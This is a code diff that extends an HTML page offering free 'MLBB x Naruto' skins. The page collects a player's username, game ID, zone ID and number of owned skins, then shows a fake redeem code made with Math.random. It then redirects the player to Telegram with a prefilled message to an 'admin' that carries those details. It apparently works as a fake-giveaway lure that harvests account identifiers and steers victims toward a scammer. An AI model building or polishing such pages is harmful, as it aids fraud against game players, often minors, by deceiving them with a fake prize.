@@ -83,16 +83,32 @@
       <h2>MLBB Naruto Skin Redeem</h2>
       <form id="redeemForm">
         <input type="text" id="username" placeholder="Enter your MLBB Username" required />
-        <input type="text" id="mlbbId" placeholder="Enter your MLBB ID" required />
-        <input type="text" id="zoneId" placeholder="Enter your Zone ID" required />
-        <select id="skinSelect" required>
-          <option value="" disabled selected>Select Your Skin</option>
-          <option>Lukas - Naruto Uzumaki</option>
-          <option>Kalea - Sakura</option>
-          <option>Hayabusa - Kakashi</option>
-          <option>Suyou - Sasuke</option>
-          <option>Ling - Neobeast</option>
+        <input type="text" id="mlbbId" placeholder="Enter your MLBB ID" required inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+        <input type="text" id="zoneId" placeholder="Enter your Zone ID" required inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+        
+        <label for="skinCount">How many skins do you own?</label>
+        <select id="skinCount" required>
+          <option value="" disabled selected>Select the number of skins you own</option>
+          <!-- Generate options 1 to 999 -->
+          <script>
+            for (let i = 1; i <= 999; i++) {
+              let option = document.createElement("option");
+              option.value = i;
+              option.textContent = `Skin ${i}`;
+              document.getElementById("skinCount").appendChild(option);
+            }
+          </script>
         </select>
+
+        <label for="skinSelect">Select a Skin MLBB X NARUTO</label>
+        <select id="skinSelect" required class="hidden">
+          <option value="" disabled selected>Select your skin</option>
+          <option value="Lukas - Naruto Uzumaki">Lukas - Naruto Uzumaki</option>
+          <option value="Kalea - Sakura">Kalea - Sakura</option>
+          <option value="Hayabusa - Kakashi">Hayabusa - Kakashi</option>
+          <option value="Suyou - Sasuke">Suyou - Sasuke</option>
+        </select>
+
         <button type="submit">Get Redeem Code</button>
       </form>
     </div>
@@ -101,7 +117,7 @@
       <div id="resultBox">
         <h3>Congratulations!</h3>
         <p>Username: <strong id="displayUsername"></strong></p>
-        <p>Selected Skin: <strong id="skinName"></strong></p>
+        <p>Selected Skin(s): <strong id="skinName"></strong></p>
         <p>Your Redeem Code: <strong id="codeResult"></strong></p>
         <p>You'll be redirected to Telegram now...</p>
       </div>
@@ -112,6 +128,15 @@
     const form = document.getElementById("redeemForm");
     const formPage = document.getElementById("formPage");
     const resultPage = document.getElementById("resultPage");
+    const skinCountSelect = document.getElementById("skinCount");
+    const skinSelect = document.getElementById("skinSelect");
+
+    // Menampilkan dropdown skin setelah memilih jumlah skin
+    skinCountSelect.addEventListener("change", function() {
+      if (skinCountSelect.value) {
+        skinSelect.classList.remove("hidden");
+      }
+    });
 
     form.addEventListener("submit", function (e) {
       e.preventDefault();
@@ -119,24 +144,26 @@
       const username = document.getElementById("username").value.trim();
       const mlbbId = document.getElementById("mlbbId").value.trim();
       const zoneId = document.getElementById("zoneId").value.trim();
-      const skin = document.getElementById("skinSelect").value;
+      const skinCount = skinCountSelect.value;
+      const selectedSkin = skinSelect.value;
 
-      if (!username || !mlbbId || !zoneId || !skin) {
+      if (!username || !mlbbId || !zoneId || !skinCount || !selectedSkin) {
         alert("Please complete all fields.");
         return;
       }
 
+      // Membuat redeem code
       const redeemCode = "MLBB-" + Math.random().toString(36).substr(2, 6).toUpperCase();
 
-      document.getElementById("displayUsername").textContent = `${username} (ID: ${mlbbId}/${zoneId})`;
-      document.getElementById("skinName").textContent = skin;
+      document.getElementById("displayUsername").textContent = `: ${username} ID : ${mlbbId} ID SERVER : ${zoneId}`;
+      document.getElementById("skinName").textContent = `${selectedSkin} (Skin Count: ${skinCount})`;
       document.getElementById("codeResult").textContent = redeemCode;
 
       formPage.classList.add("hidden");
       resultPage.classList.remove("hidden");
-      
+
       const message = encodeURIComponent(
-        `MLBB Redeem Request:\nUsername: ${username}\nID: ${mlbbId}\nZone: ${zoneId}\nSkin: ${skin}\nCode: ${redeemCode}\nHello admin, I just redeemed MLBB skin`
+        `MLBB Redeem Request:\nUsername: ${username}\nID: ${mlbbId}\nZone: ${zoneId}\nSkin Count: ${skinCount}\nSkin: ${selectedSkin}\nCode: ${redeemCode}\nHello admin, I just redeemed MLBB skin`
       );
 
       setTimeout(() => {
@@ -146,4 +173,4 @@
   </script>
 
 </body>
-</html>
+  </html>
